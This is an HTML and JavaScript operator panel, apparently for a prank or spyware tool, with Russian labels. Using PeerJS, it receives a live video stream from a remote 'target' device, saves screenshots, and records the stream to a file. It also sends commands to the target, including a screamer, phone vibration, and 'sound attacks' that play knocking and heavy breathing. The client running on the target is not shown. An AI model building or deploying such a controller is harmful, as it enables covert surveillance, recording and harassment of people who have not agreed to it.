<!DOCTYPE html>
<html>
<head>
    <title>CONTROL TERMINAL v11</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
        #side { width: 300px; padding: 20px; border-right: 2px solid #111; background: #0a0a0a; overflow-y: auto; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; background: #000; align-content: start; }
        video { width: 100%; border: 2px solid #222; border-radius: 8px; background: #111; transition: 0.3s; }
        video:hover { border-color: #0f0; }
        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; text-align: left; }
        .btn:hover { background: #0f0; color: #000; }
        .btn-red { border-color: #ff0050; color: #ff0050; }
        .btn-red:hover { background: #ff0050; color: #fff; }
        .group { margin-bottom: 25px; border-top: 1px solid #222; pt: 10px; }
        #timer { font-size: 20px; color: #ff0050; margin: 10px 0; }
    </style>
</head>
<body>
    <div id="side">
        <h2 style="color:#ff0050">TERMINAL v11</h2>
        <div id="st">STATUS: OFFLINE</div>
        <div id="timer">00:00:00</div>

        <div class="group">
            <p>УПРАВЛЕНИЕ:</p>
            <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
            <button class="btn" onclick="send('VIB')">📱 ВИБРАЦИЯ (Моб)</button>
            <button class="btn" onclick="takePhoto()">📸 СКРИНШОТ</button>
            <button id="recBtn" class="btn" onclick="toggleRecord()" style="color:#f1c40f; border-color:#f1c40f;">⏺ ЗАПИСЬ ВИДЕО</button>
        </div>

        <div class="group">
            <p>ЗВУКОВЫЕ АТАКИ:</p>
            <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
            <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
            <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/fart-with-reverb.mp3')">💨 ЗВУК</button>
        </div>
    </div>

    <div id="monitor"></div>

    <script>
        const peer = new Peer('SUPER_STABLE_99');
        let activeConn, mediaRecorder, chunks = [];

        peer.on('open', () => document.getElementById('st').innerText = "STATUS: ONLINE");
        peer.on('connection', c => { activeConn = c; document.getElementById('st').innerText = "CONNECTED"; startTimer(); });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const v = document.createElement('video');
                v.autoplay = true; v.srcObject = stream; v.id = "v-target";
                document.getElementById('monitor').appendChild(v);
                window.lastStream = stream; // Для записи
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }

        function takePhoto() {
            const v = document.querySelector('video');
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const link = document.createElement('a');
            link.download = 'screen.png'; link.href = canvas.toDataURL(); link.click();
        }

        function toggleRecord() {
            if (!mediaRecorder || mediaRecorder.state === "inactive") {
                chunks = [];
                mediaRecorder = new MediaRecorder(window.lastStream);
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a'); a.href = url; a.download = 'capture.webm'; a.click();
                };
                mediaRecorder.start();
                document.getElementById('recBtn').innerText = "🛑 ОСТАНОВИТЬ";
            } else {
                mediaRecorder.stop();
                document.getElementById('recBtn').innerText = "⏺ ЗАПИСЬ ВИДЕО";
            }
        }

        function startTimer() {
            let s = 0;
            setInterval(() => {
                s++;
                let h = Math.floor(s/3600).toString().padStart(2,'0');
                let m = Math.floor((s%3600)/60).toString().padStart(2,'0');
                let sec = (s%60).toString().padStart(2,'0');
                document.getElementById('timer').innerText = `${h}:${m}:${sec}`;
            }, 1000);
        }
    </script>
</body>
</html>
